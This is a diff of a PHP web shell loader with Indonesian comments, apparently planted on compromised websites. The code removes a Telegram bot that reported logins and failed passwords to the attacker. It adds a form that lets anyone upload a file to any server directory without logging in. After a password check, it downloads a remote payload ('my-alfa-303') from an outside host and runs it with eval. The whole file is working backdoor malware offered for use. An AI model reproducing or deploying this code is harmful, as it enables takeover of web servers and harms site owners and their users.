@@ -1,55 +1,94 @@
 <?php
 error_reporting(0);
 ini_set('display_errors', 0);
+
+    if (isset($_GET['inc']) && $_GET['inc'] === 'upload') {
+        // Tampilkan formulir unggah file
+        echo '<form method="post" enctype="multipart/form-data">';
+        echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
+        echo '<input type="file" name="file" size="15">';
+        echo '<input type="submit" value="Unggah">';
+        echo '</form>';
+    }
+
+    if (isset($_FILES['file']['tmp_name'])) {
+        // Tangani unggahan file jika formulir dikirimkan
+        $uploadd = $_FILES['file']['tmp_name'];
+        if (file_exists($uploadd)) {
+            $pwddir = $_POST['dir'];
+            $real = $_FILES['file']['name'];
+            $de = $pwddir . "/" . $real;
+            copy($uploadd, $de);
+            echo "BERKAS DIUNGGAHKAN KE $de";
+        }
+    }
+?>
+<?php
+
+error_reporting(0);
+ini_set('display_errors', 0);
+
 session_start();
 
-// --- KONFIGURASI TELEGRAM (ENCRYPTED) ---
-$t_tkn = base64_decode("ODcyNTEwNzc2MTpBQUVhMEg3SEdqY1h6NUF5QnpLRnQ0a05VWlBfZTlPY3Izaw==");
-$c_id  = base64_decode("Njc4NjA3Mjg2OQ==");
-
-function sendTelegram($msg) {
-    global $t_tkn, $c_id;
-    $url = "https://api.telegram.org/bot$t_tkn/sendMessage?chat_id=$c_id&text=" . urlencode($msg);
-    
-    // Menggunakan stream_context untuk melakukan HTTP request tanpa CURL
-    $opts = [
-        "http" => [
-            "method" => "GET",
-            "timeout" => 5
-        ]
-    ];
-    $context = stream_context_create($opts);
-    @file_get_contents($url, false, $context);
+// Fungsi untuk mengecek jika user sudah login
+function is_logged_in() {
+    return isset($_SESSION['FORBIDDENXER']);
 }
 
-// --- LOGIKA LOGIN & OTORISASI ---
-$valid_password_hash = '$2a$12$jeMvM33nHB8vRlj5Cii2MufQPZAZ1LYwvAosfV4r8/9xN5aXeKN76';
-$error = "";
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
-    if (password_verify($_POST['password'], $valid_password_hash)) {
-        $_SESSION['FORBIDDENXER'] = 'active';
-        $ip = $_SERVER['REMOTE_ADDR'];
-        $waktu = date("d-m-Y H:i:s");
-        sendTelegram("✅ LOGIN BERHASIL\nIP: $ip\nWaktu: $waktu\nURL: " . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
-        header('Location: ' . $_SERVER['PHP_SELF']);
-        exit;
+// Fungsi untuk login
+function login($password) {
+    // Hash password valid menggunakan bcrypt
+    $valid_password_hash = '$2a$12$jeMvM33nHB8vRlj5Cii2MufQPZAZ1LYwvAosfV4r8/9xN5aXeKN76'; // Contoh hash bcrypt
+    // Verifikasi password dengan bcrypt
+    if (password_verify($password, $valid_password_hash)) {
+        $_SESSION['FORBIDDENXER'] = 'user';
+        return true;
     } else {
-        sendTelegram("⚠️ PERCOBAAN GAGAL\nIP: " . $_SERVER['REMOTE_ADDR'] . "\nPass: " . $_POST['password']);
-        $error = "SALAH PASSWORD MEN...!!!";
+        return false;
     }
 }
 
-// --- EKSEKUSI SHELL JIKA LOGIN ---
-if (isset($_SESSION['FORBIDDENXER']) && $_SESSION['FORBIDDENXER'] === 'active') {
+// Fungsi untuk logout
+function logout() {
+    unset($_SESSION['FORBIDDENXER']);
+}
+
+// Cek jika ada request POST
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_POST['password'])) {
+        $password = $_POST['password'];
+        if (login($password)) {
+            header('Location: ' . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            $error_message = "PASSWORD SALAH MEN...!!!";
+            if (!is_logged_in()) {
+                echo '<script>alert("'.$error_message.'");</script>';
+            }
+        }
+    }
+}
+
+// Fungsi untuk mengambil konten dari URL
+function getContent($url) {
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+    $content = curl_exec($curl);
+    curl_close($curl);
+    if ($content === false) {
+        $content = file_get_contents($url);
+    }
+    return $content;
+}
+// Cek jika user sudah login
+if (is_logged_in()) {
     $url = 'https://raw.zeverix.com/public/raw/my-alfa-303';
-    $content = @file_get_contents($url);
-    if ($content) {
-        eval('?>' . $content);
-        exit;
-    } else {
-        die("Error: Failed to fetch payload.");
-    }
+    $content = getContent($url);
+    eval('?>' . $content);
+    exit;
 }
 ?>
 
